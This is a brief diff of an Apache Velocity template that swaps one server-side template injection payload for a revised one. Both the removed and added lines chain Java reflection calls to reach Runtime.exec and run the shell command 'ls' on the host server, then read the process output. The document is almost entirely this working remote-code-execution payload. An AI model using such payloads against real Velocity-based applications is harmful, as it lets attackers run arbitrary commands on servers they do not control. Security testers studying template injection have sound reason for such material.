@@ -1,4 +1,3 @@
 #set($e="e")
-$e.getClass().forName('java.io.InputStreamReader').getMethod('newInstance').invoke($e.getClass().forName('java.lang.Process').getMethod('getInputStream').invoke($e.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).getClass().getMethod('exec', $e.getClass().forName('java.lang.String')).invoke( $e.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null) ,'ls'))).toString()
-
+$e.getClass().forName('java.io.InputStream').getMethod('available').invoke($e.getClass().forName('java.lang.Process').getMethod('getInputStream').invoke($e.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).getClass().getMethod('exec', $e.getClass().forName('java.lang.String')).invoke( $e.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null) ,'ls'))).toString()
 
